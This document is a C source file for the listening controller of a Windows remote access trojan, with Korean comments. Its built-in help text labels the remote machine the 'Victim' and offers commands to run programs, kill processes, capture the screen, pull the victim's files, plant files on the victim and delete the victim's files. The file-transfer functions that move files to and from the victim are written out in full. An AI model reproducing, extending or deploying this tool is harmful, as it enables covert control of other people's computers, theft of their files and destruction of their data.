#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <WinSock2.h> // sockt function , socket structure, windows.h
#include <WS2tcpip.h> // ip address search, tcp/ip protocol
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#pragma comment (lib, "Ws2_32")
#pragma once

#define DEFAULT_BUFLEN 4096

int InitSocket(SOCKET *ConnectSocket, char *port) {
	WSADATA wsaData; //winsock api

					 // 1. Winsock 초기화
					 // iResult = WSAStartup(MAKEWORD(2, 2), &wsaData); //WS2_32.dll,version 2.2 of Winsock 
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSAStartup failed\n");
		return 1;
	}

	// 2. socket address 설정
	struct addrinfo *result = NULL, *ptr = NULL, hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET; // ai => addressinfo
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	if (getaddrinfo(NULL, port, &hints, &result) != 0) { //나의 dns(NULL)에 27015포트에 힌트 소켓을 넣어서
															//struct addrinfo result주소로 바꿈
		printf("getaddrinfo failed\n");
		WSACleanup();
		return 1;
	}

	// 3. 수신대기
	SOCKET ListenSocket = INVALID_SOCKET;
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

	if (ListenSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// 4. 소켓 바인딩: 서버가 클라이언트 연결을 허용하려면 시스템 내의 네트워크 주소에 바인드되어야합니다
	if (bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);  // bind함수가 호출되면 struct addrinfo는 더 이상 사용되지 않는다

						   // 5. 소켓 리스닝: 바인딩되면 서버는 들어오는 연결 요청에 대해 해당 IP 주소와 포트에서 수신 대기해야합니다
	if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) {
		printf("Listen failed with error: %ld", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// 6. 연결 수락(accept)
	struct sockaddr_in client_info;
	int sockaddr_size = sizeof(struct sockaddr_in);
	
	*ConnectSocket = accept(ListenSocket, (struct sockaddr*)&client_info, &sockaddr_size);
	if (*ConnectSocket == INVALID_SOCKET) {
		printf("accept failed: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	//accept한 pc의 ip 출력해주는 부분
	char client_addr[16] = "";
	InetNtop(AF_INET, &client_info.sin_addr, client_addr, sizeof(client_addr));
	printf("Aceept Client: %s\a\n", client_addr);
	return 0;
}

int Get_File(SOCKET *ConnectSocket, char *recvbuf, char *sendbuf) {
	char data[DEFAULT_BUFLEN] = "";
	strcpy_s(data, DEFAULT_BUFLEN, sendbuf + 4);

	if (data[strlen(data) - 1] == '\n')
		data[strlen(data) - 1] = '\0';

	FILE *fget;
	char fileerr[DEFAULT_BUFLEN];
	memset(fileerr, 0, DEFAULT_BUFLEN);
	int iResult = 0;

	// client file error recv
	iResult = recv(*ConnectSocket, fileerr, DEFAULT_BUFLEN, 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}
	if (!strncmp(fileerr, "file", 4)) {//none-file(file does not found) error received
		printf("file does not found.\n");
		return 1;
	}
	// server file create
	int err;
	//여기 아래에 모든경로 뺀 이름만으로 파일생성하도록 바꿈
	char *ptr = data;
	if (strrchr(ptr, '\\') != NULL)	ptr = strrchr(ptr, '\\') + 1;
	
	err = fopen_s(&fget, ptr, "wb");
	if (err != 0) {
		printf("File creation fail...\n");
		iResult = send(*ConnectSocket, "fail", 4, 0);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}
		return 1;
	}
	iResult = send(*ConnectSocket, "success", 7, 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}

	// client file size recv
	memset(recvbuf, 0, DEFAULT_BUFLEN);
	long long num;
	iResult = recv(*ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}
	num = atoll(recvbuf)+1;

	// client file recv
	printf("Receive");
	while ( num > 0 && select(NULL, (fd_set*)ConnectSocket, NULL, NULL, NULL)) {
		iResult = recv(*ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}
		else if (!strncmp(recvbuf, "sefskdn", 7)) break;
		else {
			fwrite(recvbuf, sizeof(char), DEFAULT_BUFLEN, fget);
			printf(".");
			num--;
			iResult = send(*ConnectSocket, "success", 7, 0);
			if (iResult == SOCKET_ERROR) {
				closesocket(*ConnectSocket);
				WSACleanup();
				return 1;
			}
		}
	}

	// end
	fclose(fget);
	memset(recvbuf, 0, DEFAULT_BUFLEN);
	printf("\nReceived the file completely!\n");
	return 0;
}

int Send_File(SOCKET *ConnectSocket, char *recvbuf, char *sendbuf) {
	char data[DEFAULT_BUFLEN] = "";
	strcpy_s(data, DEFAULT_BUFLEN, sendbuf + 4);

	if (data[strlen(data) - 1] == '\n')
		data[strlen(data) - 1] = '\0';
	
	int iResult = 0;
	int err;
	FILE *fput;

	char *ptr = data;
	if (strrchr(ptr, '\\') != NULL)	ptr = strrchr(ptr, '\\') + 1;
	err = fopen_s(&fput, ptr, "rb");

	if (err != 0) {
		sprintf_s(sendbuf, DEFAULT_BUFLEN, "file err\n");
		iResult = send(*ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);//error send
		Sleep(100);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}
		printf("file does not found.\n");
		return 1;
	}

	//if (strrchr(ptr, '\\') != NULL) ptr = strrchr(ptr, '\\') + 1;
	sprintf_s(sendbuf, DEFAULT_BUFLEN, "start");
	
	iResult = send(*ConnectSocket, sendbuf, (int)strlen(sendbuf), 0); Sleep(100);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}


	iResult = recv(*ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0); Sleep(100);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}
	if (!strncmp(recvbuf, "error", 5))
		return 1;

	/*file size send*/
	_fseeki64(fput, 0, SEEK_END);
	long long num;
	if (_ftelli64(fput) < DEFAULT_BUFLEN || _ftelli64(fput) % DEFAULT_BUFLEN != 0)
		num = _ftelli64(fput) / DEFAULT_BUFLEN + 1;
	else num = _ftelli64(fput) / DEFAULT_BUFLEN;
	_fseeki64(fput, 0, SEEK_SET);
	sprintf_s(sendbuf, DEFAULT_BUFLEN, "%lld", num);
	iResult = send(*ConnectSocket, sendbuf, DEFAULT_BUFLEN, 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}

	/*file send*/
	printf("Send");
	while ( num > 0 && select(NULL, (fd_set*)ConnectSocket, NULL, NULL, NULL)) {
		//Sleep(1);
		fread(sendbuf, sizeof(char), DEFAULT_BUFLEN, fput);

		iResult = send(*ConnectSocket, sendbuf, DEFAULT_BUFLEN, 0);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}

		iResult = recv(*ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}
		num--;
		printf(".");
	}
	fclose(fput);

	/*end*/
	sprintf_s(sendbuf, DEFAULT_BUFLEN, "sefskdn");//send end file soc ket dow n
	iResult = send(*ConnectSocket, sendbuf, DEFAULT_BUFLEN, 0); Sleep(100);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}
	memset(sendbuf, 0, DEFAULT_BUFLEN);
	printf("\nSend file completely!\n");
	return 0;
}

int main(int argc, char **argv) {
	
	/*if (argc != 2) {
		printf("server.exe port-number\n");
		return 1;
	}*/
	if (argc > 2) {
		return 1;
	}

	FILE *readme;
	char *read = "Cmd Command - available\n\
start <program> : Execute\n\
tasklist : If you want an accurate result, please do 'tasklist' twice\n\
taskkill /F /PID <PID>\n\
screenshot : Capture the screen\n\
*File PATH: Based on Victim*\n\
get <Victim's_File> : Recieve a file from Victim\n\
put <Hacker's_File> : Give a file to the Victim, PATH(Based on Hacker)\n\
remove <Victim's_File> : Completely Delete the victim's files\n\
ex) put ..\\..\\Desktop\\test\\cat.jpg\n\
Exit : Ctrl + C\n";

	if (fopen_s(&readme, "README.txt", "w") == 0) {
		fwrite(read, sizeof(char), strlen(read), readme);
	}
	fclose(readme);
	system("start README.txt");
	printf("%s", read);

	SOCKET ClientSocket = INVALID_SOCKET;
	argv[1] = "27015";
	if (InitSocket(&ClientSocket, argv[1]) != 0) {
		printf("connect fail...\n");
		return 0;
	}

	// 7. Data Send, Receive
	char recvbuf[DEFAULT_BUFLEN];
	char sendbuf[DEFAULT_BUFLEN];
	int iResult = 0;
	int iSendResult = 0;

	do {// receive untill the peer shuts down the connection
		/*
		명령어 fgets로 받아서 send과정,
		end 문자열 수신때까지 recv과정
		*/
		memset(sendbuf, 0, DEFAULT_BUFLEN);
		fgets(sendbuf, DEFAULT_BUFLEN, stdin);
		//printf("sendbuf: %s\n", sendbuf);
		iSendResult = send(ClientSocket, sendbuf, DEFAULT_BUFLEN, 0);
		if (iSendResult == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
			closesocket(ClientSocket);
			WSACleanup();
			return 1;
		}

		if (!strncmp(sendbuf, "put", 3))
			Send_File(&ClientSocket, recvbuf, sendbuf);

		if (!strncmp(sendbuf, "get", 3))
			Get_File(&ClientSocket, recvbuf, sendbuf);

		do {
			//Sleep(100);
			memset(recvbuf, 0, DEFAULT_BUFLEN);
			if (!select(NULL, (fd_set*)ClientSocket, NULL, NULL, NULL)) break;

			iResult = recv(ClientSocket, recvbuf, DEFAULT_BUFLEN, 0);
			if (iResult > 0) {
				if (!strncmp(recvbuf, "end", 3)) { memset(recvbuf, 0, DEFAULT_BUFLEN); break; }
				else printf("%s", recvbuf);
			}

			else if (iResult == 0)
				printf("Connection closing...\n");

			else {
				printf("recv failed: %d\n", WSAGetLastError());
				closesocket(ClientSocket);
				WSACleanup();
				return 1;
			}
		} while (TRUE);

	} while (select(NULL, (fd_set*)ClientSocket, NULL, NULL, NULL));

	// 8. Disconnecting
	if (shutdown(ClientSocket, SD_SEND) == SOCKET_ERROR) {
		printf("shutdown failed: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 1;
	}

	// 9. cleanup
	closesocket(ClientSocket);
	WSACleanup();

	return 0;
}